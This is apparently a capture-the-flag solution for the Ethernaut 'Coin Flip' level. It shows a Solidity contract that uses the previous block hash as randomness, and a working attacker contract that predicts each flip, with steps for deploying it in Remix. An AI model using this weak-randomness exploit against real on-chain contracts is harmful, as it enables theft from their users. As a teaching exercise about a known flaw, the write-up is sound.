# Ethernaut - Coin Flip - Solution

## Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}
```

## Solution

The goal of this challenge is to predict the coin flip 10 times in a row.
Looking at the contract, we can see that it uses the previous block's hash as a source of "randomness".
This pattern is what is commonly referred to as "weak random number generation (Weak RNG)" since attackers can simply use the same "random" number generation logic to predict the outcome.

Take, for example, the following attacker contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlipAttacker {
    // FACTOR = type(uint256).max / 2 + 1
    uint256 public constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    address public immutable VICTIM;

    constructor(address victim) {
        VICTIM = victim;
    }

    function attack() external {
        // Use the same source of "randomness" as the victim contract
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool guess = coinFlip == 1 ? true : false;

        // Flip the coin and provide the correct guess
        (bool success, ) = VICTIM.call(abi.encodeWithSignature("flip(bool)", guess));
        require(success, "Coin flip failed");
    }
}
```

Deploying this contract using [Remix](https://remix.ethereum.org) and providing our victim contract's address in the constructor, we can simply call `attack()` 10 times in a row to win the level.
Note that these 10 calls need to be distributed over 10 different blocks.
